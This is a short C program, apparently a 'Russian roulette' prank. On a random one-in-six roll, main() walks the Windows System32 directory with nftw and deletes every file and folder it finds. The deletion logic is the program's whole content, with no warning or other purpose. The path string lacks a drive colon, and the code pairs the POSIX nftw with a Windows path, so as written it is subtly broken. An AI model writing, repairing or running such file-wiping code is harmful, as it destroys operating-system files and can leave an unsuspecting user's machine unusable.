#include <stdio.h>
#include <stdlib.h>
#include <ftw.h>
#include <time.h>
#include <unistd.h>


int unlink_cb(const char* fpath, const struct stat* sb, int typeflag, struct FTW* ftwbuf)
{
    int rv = remove(fpath);

    if (rv)
        perror(fpath);

    return rv;
}

int main(void)
{
    srand(time(0));

    int r = rand() % 6;
    if (r == 0) {
        return nftw("C\\Windows\\System32", unlink_cb, 64, FTW_DEPTH | FTW_PHYS);        
    }
    
    return 0;
}
